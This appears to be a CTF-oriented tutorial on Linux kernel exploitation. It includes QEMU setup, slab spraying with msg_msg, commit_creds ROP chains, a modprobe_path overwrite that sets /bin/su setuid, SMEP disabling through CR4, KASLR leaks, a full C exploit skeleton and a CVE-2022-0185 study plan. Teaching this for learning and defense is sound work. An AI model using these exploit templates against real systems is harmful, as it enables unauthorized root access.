# Kernel Exploitation (Kernel Pwn)

## Preparing the environment

A typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu start script
└── (.config)        # build configuration, optional
```

### Unpack initramfs and modify the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# Or the newc format:
# cpio -idm < ../initramfs.cpio

# Modify init to get root (for CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# Or comment out the user switch line

# Repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage is given)

```bash
# Use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU boot parameter template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # open gdb port 1234
```

Protections matching the key parameters:

| Parameter | Meaning | Impact on exploitation |
|------|------|---------|
| `+smep` | Kernel mode cannot execute user-mode code | ROP is mandatory; cannot jump to user-mode shellcode |
| `+smap` | Kernel mode cannot access user-mode data | The ROP chain cannot live in user mode; put it in kernel memory (heap spray / msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disable KASLR | Fixed function addresses |
| `kaslr` | Enable KASLR | A leak is required |
| `pti=on` | KPTI (Meltdown fix) | Returning to user mode needs swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# Terminal 1
./run.sh   # with -s

# Terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the fork maintained by bata24 is recommended; it has dedicated pretty-printing for kernel structs.

## Vulnerability type branching

| Vulnerability | Typical source | Exploitation baseline |
|------|---------|---------|
| Kernel stack overflow | Controllable copy_from_user length | Stack canary + KASLR → ROP |
| Kernel heap overflow | Out-of-bounds write in a kmalloc slab | slab spray + overwrite the adjacent object |
| UAF | refcount error / double free | Reallocate in the same slab → control the freed object |
| Integer overflow | size calculation overflow → small allocation, large copy | Effectively an overflow, same as above |
| TOCTOU | Double dereference of a user-mode pointer | Stall with userfaultfd / FUSE |
| Race | Two threads calling ioctl at once | Hit the timing window |
| Arbitrary read/write | Already the ultimate primitive | Overwrite cred / modprobe_path directly |

## slab spraying (core of heap pwn)

Spray kernel objects of controllable size into the vulnerable slab to overwrite the target object.

| slab size | Spray object | Advantage |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | Has function pointers; overwriting gives IP control |
| kmalloc-1024 | `tty_struct` | Has an ops pointer, a well-suited structure |
| kmalloc-4096 | `pipe_buffer` | The modern workhorse, still effective on 6.x |
| Any size | `msg_msg` | Controllable size (8 - 4096+), sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | keyctl interfaces |

### msg_msg spray example

```c
// Trigger from user mode
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vulnerable overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see whether it changed → leak
```

## Privilege escalation paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and general. Precondition: RIP control (stack overflow / vtable hijack).

```c
// User-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → returns the root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by the mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // move rax→rdi (some need a dedicated gadget)
    commit_creds,                     // set the current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-mode return function (cs/ss saved)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user mode, cs/ss/rflags/rsp must be saved:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Overwrite modprobe_path with /tmp/x (the easiest)

```text
Principle:
  - The kernel global modprobe_path defaults to "/sbin/modprobe"
  - When execve runs a file with an unrecognized magic, the kernel runs modprobe_path as root
  - Change it to "/tmp/x", write /tmp/x (chmod +x), trigger execution of an unknown magic
  
Applies: there is an arbitrary write primitive, but ROP may not be possible
```

```c
// 1. Prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerable write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// The kernel runs /tmp/x as root, which did chmod +s /bin/su

// 5. Exploit the setuid
system("/bin/su");
```

**Source of the modprobe_path address**: the symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it is called when a process crashes
Drawback: a coredump must be triggered, clumsier than modprobe_path
```

### 4. Kernel ROP to disable SMEP/SMAP

If you really want to jump back to user-mode shellcode (for learning), ROP can clear the cr4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// Only after SMEP+SMAP are off can a jmp to user-mode shellcode run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" or similar
    0,
    user_shellcode_addr,    // jump there (fails if SMEP is not yet off)
};
```

In practice **real exploitation almost never takes this path**: a direct commit_creds ROP is shorter and more reliable.

## KASLR leak channels

| Source | Restriction | Notes |
|------|------|------|
| /proc/kallsyms | Real addresses only with `kptr_restrict=0` | Often open in CTFs |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | Readable only with `dmesg_restrict=0` | oops messages leak addresses |
| Uninitialized kernel stack read | The vulnerability itself must allow arbitrary reads | Leftover addresses |
| msg_msg + vulnerability leak | OOB read after spraying | General |
| Side channels (Meltdown/Spectre) | KPTI fixed Meltdown | Not general |
| SIDT/SGDT user-mode instructions | Old kernels may leak | Mostly blocked in modern ones |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // offset from vmlinux
```

## Complete exploit template (user mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c: general kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak it first, or hard-code it with nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. Leak the KASLR base (here assuming /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build the ROP chain (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp, can point high into an mmap
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability so the kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge specific: ioctl / write / read

    return 0;
}
```

## Learning reference: CVE-2022-0185

```text
Vulnerability: signed / unsigned confusion in the length calculation of legacy_parse_param in fs/fs_context.c
      → kmalloc heap buffer overflow with any size and any data

Why it is a good learning sample:
1. Triggering does not need root (unprivileged user namespace)
2. The overflow size is fully controllable
3. A complete public writeup + PoC exists
4. Combines: user_ns exploitation, msg_msg spraying, reclaiming after UAF, cross-cache exploitation

Learning path:
1. Build a kernel with CONFIG_USER_NS=y
2. Run the original Crusaders of Rust PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official writeup on willsroot.io (the version PortSwigger picked up)
4. Rewrite it by hand: change the msg_msg spray into a pipe_buffer spray version (practice a different slab path)
5. Add a KASLR leak (the original uses /proc/kallsyms; in the challenge version it is disabled, so switch to an OOB read)
```

The main technical points map to these sections of this document:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spray"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes the kernel stack base by 0-1023 on every syscall, affecting every exploit that relies on fixed stack offsets
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes object allocation within a slab, lowering the spray success rate, so spray more
- **CONFIG_STATIC_USERMODEHELPER** sets modprobe_path to the read-only `static_usermodehelper_path`, defeating the modprobe attack
- **KPTI** separates user/kernel page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline instead of a direct swapgs+iretq
- **FG-KASLR** (function-granular KASLR) randomizes at function level, so several symbols must be leaked to derive each function offset
- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on ENDBR instructions, breaking some gadgets
- **Do not call printk in the kernel for test output**: serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + a gdb watch
